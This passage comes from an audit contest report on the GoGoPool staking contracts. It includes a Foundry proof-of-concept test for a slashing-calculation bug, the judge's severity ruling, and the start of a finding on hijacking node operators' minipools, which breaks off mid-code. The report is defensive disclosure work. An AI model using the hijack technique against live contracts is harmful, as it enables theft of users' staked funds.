permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Test in <code>MinipoolManager.t.sol</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testRecordStakingEndWithSlashHighDuration</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">365</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">validationAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">200</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">), </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mp1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">createMinipool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">, </span><span class=\"mtk12\">duration</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liqStaker1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getActorWithTokens</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;liqStaker1&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">liqStaker1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositAVAX</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimAndInitiateStaking</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">txID</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;txid&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">recordStakingStart</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">txID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// a two week cycle</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk12\">recordStakingEnd</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">validationAmt</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MinipoolManager&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getIndexOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMinipool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">status</span><span class=\"mtk1\">, </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MinipoolStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Withdrawable</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxTotalRewardAmt</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertTrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endTime</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxNodeOpRewardAmt</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxLiquidStakerRewardAmt</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getTotalAVAXLiquidStakerAmt</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAVAXAssigned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMinipoolCount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">// log slash amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;slashedAmount&quot;</span><span class=\"mtk1\">,</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ggpSlashAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span></code></pre>\n<p>Slashed amount for a <code>365 days</code> duration is <code>100 eth</code> (10%). However, where they to stake for the minimum time, <code>14 days</code> the slashed amount would be only ~<code>3.8 eth</code>.</p>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>vs code, forge</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Either hard code the duration to 14 days for calculating expected rewards or calculate the actual duration using <code>startTime</code> and <code>endTime</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/493#event-8306021419\">0xju1ie (GoGoPool) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/493#issuecomment-1413687136\">Alex the Entreprenerd (judge) increased severity to High and commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown an incorrect formula that uses the <code>duration</code> of the pool for slashing.</p>\n<p>The resulting loss can be up to 26 times the yield that should be made up for.</p>\n<p>Because the:</p>\n<ul>\n<li>Math is incorrect</li>\n<li>Based on intended usage</li>\n<li>Impact is more than an order of magnitude off</li>\n<li>Principal is impacted (not just loss of yield)</li>\n</ul>\n<p>I believe the most appropriate severity to be High.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed\">emersoncloud (GoGoPool) mitigated</a>:</strong></p>\n<blockquote>\n<p>Base slash on validation period not full duration: <a href=\"https://github.com/multisig-labs/gogopool/pull/41\">multisig-labs/gogopool#41</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/3\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/22\">hansfriese</a>.</p>\n<hr>\n<h2 id=\"h-04-hijacking-of-node-operators-minipool-causes-loss-of-staked-funds\" style=\"position:relative;\"><a href=\"#h-04-hijacking-of-node-operators-minipool-causes-loss-of-staked-funds\" aria-label=\"h 04 hijacking of node operators minipool causes loss of staked funds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/213\">[H-04] Hijacking of node operators minipool causes loss of staked funds</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/213\">0xdeadbeef0x</a>, also found by <a href=\"undefined\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/879\">datapunk</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/805\">0xmint</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/792\">Lirios</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/772\">AkshaySrivastav</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/752\">adriro</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/751\">ak1</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/738\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/726\">pauliax</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/703\">imare</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/699\">imare</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/692\">immeas</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/679\">sces60107</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/671\">peritoflores</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/640\">wagmi</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/617\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/602\">sk8erboy</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/568\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/524\">caventa</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/500\">yixxas</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/485\">Franfran</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/482\">clems4ever</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/425\">Ch_301</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/396\">Allarious</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/355\">0xc0ffEE</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/303\">0Kage</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/263\">kaliberpoziomka8552</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/257\">kaliberpoziomka8552</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/255\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/199\">wallstreetvilkas</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/196\">stealthyz</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/181\">cozzetti</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/173\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/123\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/83\">chaduke</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/81\">chaduke</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/76\">Manboy</a></em></p>\n<p>A malicious actor can hijack a minipool of any node operator that finished the validation period or had an error.</p>\n<p>The impacts:</p>\n<ol>\n<li>Node operators staked funds will be lost (Loss of funds)</li>\n<li>Hacker can hijack the minipool and retrieve rewards without hosting a node. (Theft of yield)</li>\n</ol>\n<p>2.1 See scenario #2 comment for dependencies</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Background description</strong></p>\n<p>The protocol created a state machine that validates transitions between minipool states. For this exploit it is important to understand three states:</p>\n<ol>\n<li><code>Prelaunch</code> - This state is the initial state when a minipool is created. The created minipool will have a status of <code>Prelaunch</code> until liquid stakers funds are matched and <code>rialto</code> stakes 2000 AVAX into Avalanche.</li>\n<li><code>Withdrawable</code> - This state is set when the 14 days validation period is over. In this state:<br>\n2.1. <code>rialto</code> returned 1000 AVAX to the liquid stakers and handled reward distribution.<br>\n2.2. Node operators can withdraw their staked funds and rewards.<br>\n2.3. If the node operator signed up for a duration longer than 14 days <code>rialto</code> will recreate the minipool and stake it for another 14 days.<br></li>\n<li><code>Error</code> - This state is set when <code>rialto</code> has an issue to stake the funds in Avalanche</li>\n</ol>\n<p>The state machine allows transitions according the <code>requireValidStateTransition</code> function:\n<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L164\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L164</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function requireValidStateTransition(int256 minipoolIndex, MinipoolStatus to) private view {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">------</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        } else if (currentStatus == MinipoolStatus.Withdrawable || currentStatus == MinipoolStatus.Error) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tisValid = (to == MinipoolStatus.Finished || to == MinipoolStatus.Prelaunch);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t} else if (currentStatus == MinipoolStatus.Finished || currentStatus == MinipoolStatus.Canceled) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Once a node is finished/canceled, if they re-validate they go back to beginning state</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tisValid = (to == MinipoolStatus.Prelaunch);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">------</span></span></code></pre>\n<p>In the above restrictions, we can see that the following transitions are allowed:</p>\n<ol>\n<li>From <code>Withdrawable</code> state to <code>Prelaunch</code> state. This transition enables <code>rialto</code> to call <code>recreateMinipool</code></li>\n<li>From <code>Finished</code> state to <code>Prelaunch</code> state. This transition allows a node operator to re-use their nodeID to stake again in the protocol.</li>\n<li>From <code>Error</code> state to <code>Prelaunch</code> state. This transition allows a node operator to re-use their nodeID to stake again in the protocol after an error.</li>\n</ol>\n<p>#2 is a needed capability, therefore <code>createMinipool</code> allows overriding a minipool record if:\n<code>nodeID</code> already exists and transition to <code>Prelaunch</code> is permitted</p>\n<p><code>createMinipool</code>: <br><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L242\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L242</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction createMinipool(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\taddress nodeID,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 duration,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 delegationFee,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 avaxAssignmentRequest</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t) external payable whenNotPaused {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">---------</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Create or update a minipool record for 